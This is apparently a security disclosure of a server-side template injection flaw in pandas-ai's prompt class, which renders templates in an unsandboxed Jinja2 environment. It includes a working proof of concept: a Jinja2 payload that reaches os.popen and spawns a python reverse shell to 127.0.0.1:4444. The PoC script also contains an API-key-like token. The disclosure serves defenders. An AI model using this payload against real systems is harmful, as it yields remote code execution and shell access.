# Pandas-Ai prompt SSTI RCE

## Description

`pandas-ai`'s `pandas-ai/pandasai/prompts/base.py` defined a `base class` for all prompt-related actions -> `class BasePrompt`; `class BasePrompt` depends on `Jinja2`'s renderer as template engineering for prompt parsing. Nevertheless, `self.template` that was parsed as a parameter will be interpreted by `from_string()` based on `jinja2` sandbox-less environment `jinja2.Environment()` and rendered in `__str__` *(`to_string`)* or `.render`; allowing Arbitrary function call / escape by `attribution referencing` of `Server-Side Template Injections` in key components such as `OpenAI()`, `LangchainLLM()`, `LocalLLM()`, `HuggingFaceTextGen()`, etc.

## Source To Sink

### `pandas-ai/pandasai/prompts/base.py`

```python
""" Base class to implement a new Prompt
In order to better handle the instructions, this prompt module is written.
"""
import os
import re
from pathlib import Path
from typing import Optional

from jinja2 import Environment, FileSystemLoader


class BasePrompt:
    """Base class to implement a new Prompt.

    Inheritors have to override `template` property.
    """

    template: Optional[str] = None
    template_path: Optional[str] = None

    def __init__(self, **kwargs):
        """Initialize the prompt."""
        self.props = kwargs

        if self.template:
            env = Environment()
            self.prompt = env.from_string(self.template)
        elif self.template_path:
            # find path to template file
            current_dir_path = Path(__file__).parent
            path_to_template = os.path.join(current_dir_path, "templates")
            env = Environment(loader=FileSystemLoader(path_to_template))
            self.prompt = env.get_template(self.template_path)

        self._resolved_prompt = None

    def render(self):
        """Render the prompt."""
        render = self.prompt.render(**self.props)

        # Remove additional newlines in render
        render = re.sub(r"\n{3,}", "\n\n", render)

        return render

    def to_string(self):
        """Render the prompt."""
        if self._resolved_prompt is None:
            self._resolved_prompt = self.prompt.render(**self.props)

        return self._resolved_prompt

    def __str__(self):
        return self.to_string()

    def validate(self, output: str) -> bool:
        return isinstance(output, str)

    def to_json(self):
        """
        Return Json Prompt
        """
        raise NotImplementedError("Implementation required")
```

`pandas-ai/pandasai/prompts/base.py` defined a base model for Prompt related functions in `pandas-ai`, at `env = Environment(loader=FileSystemLoader(path_to_template))`, `self.prompt = env.from_string(self.template)`; we can see that it depends on `jinja2` as it's prompt template renderer. Whenever `self.template` or `self.template_path` is passed into `BasePrompt`'s `__init__` constructor, `self.prompt` will be loaded as `env.from_string(self.template)` or `env.get_template(self.template_path)` on environment `jinja2.Environment()`; in which will be rendered whenever the class is stringified, `render` or `to_string` method is called; Nevertheless, the use of `jinja2.Environment()` in this instance is extremely unsafe since, when the template is rendered, it allows arbitrary access to native constructors like `__class__`,`__builtins__` of arbitrary object, allowing `untrusted constructor referencing`, allowing attackers to call dangerous `__builtins__` method such as `__import__`, causing RCEs.



Next, by cross-referencing, we found most native LLM (including `OpenAI()`, `LangchainLLM()`, `LocalLLM()`, `HuggingFaceTextGen() `etc) integrated in `pandas-ai` are implementing `instruction` as the parameter for interactive method, in which `instruction` (as `BasePrompt`) is furtherly parsed by `instruction.to_string()`, which as previously noted will result in render of the `self.template`. In our case, taking a look into `OpenAI()` -> `call()` method as instance:

```python
    def call(self, instruction: BasePrompt, context: PipelineContext = None):
        """
        Call the OpenAI LLM.

        Args:
            instruction (BasePrompt): A prompt object with instruction for LLM.
            context (PipelineContext): context to pass.

        Raises:
            UnsupportedModelError: Unsupported model

        Returns:
            str: Response
        """
        self.last_prompt = instruction.to_string()

        memory = context.memory if context else None

        return (
            self.chat_completion(self.last_prompt, memory)
            if self._is_chat_model
            else self.completion(self.last_prompt, memory)
        )

```

`OpenAI()` -> `call()` parse `instruction` into `self.last_prompt` using vulnerable `to_string()` method derived from `BasePrompt` and return us the `chat_completion` result of this prompt with call-chain `instruction` -> `self.template` -> `self.prompt` -> `to_string(self)` -> `self._resolved_prompt = self.prompt.render(**self.props)`. Now we can construct an exploitation chain based on it, in our case, we designed:

```python
class OpenAIPrompt(BasePrompt):
    template:str = """{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\\'')}} {% endif %} {% endfor %}"""
```

Which this `jinja2` template does is that it will traverse around `().__class__.__base__.__subclasses__()` to look for native `object` class `warning` then we access its module via the `__module__` attribute then implement Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally called `os.popen` to open an `reverse-shell connection` on `127.0.0.1:4444`

After that, we will parse the costume `OpenAIPrompt` class into `llm.call(instruction=prompt)` (after instancing `OpenAI(api_token=)`) *(Using costume class to set `self.template`, you may reference other `pandas-ai native prompts` or create `attribute` `self.template` by other vector)*. Immediately, as the `llm.call` is started, a reverse-shell connection will be established; and this is what happened:

1. `OpenAIPrompt` being instanced;
2. `self.template` exists; creating ` self.prompt = env.from_string(self.template)`;
3. `self.last_prompt = instruction.to_string()` triggered `self._resolved_prompt = self.prompt.render(**self.props)`;
4. malicious `prompt` being `rendered` by the `jinja2 template renderer`;
5. `os` being imported by `constructor referencing`;
6. `python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")` being executed;
7. `reverse-shell connection`



PoC Script:

```python
from pandasai.prompts import BasePrompt
from pandasai.llm import OpenAI


class OpenAIPrompt(BasePrompt):
    template:str = """{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\\'').read()}} {% endif %} {% endfor %}"""
    
prompt = OpenAIPrompt()
llm = OpenAI(api_token="sk-proj-0nzUgsM2Pjmy5RgpCVxdT3BlbkFJkRzmEFNuBc1dwbjNuWBG")
llm.call(instruction=prompt)

```

PoC Video: https://drive.google.com/file/d/1FR-VwU44UzaJ18dHTfNdWs6ywUaebxmy/view?usp=sharing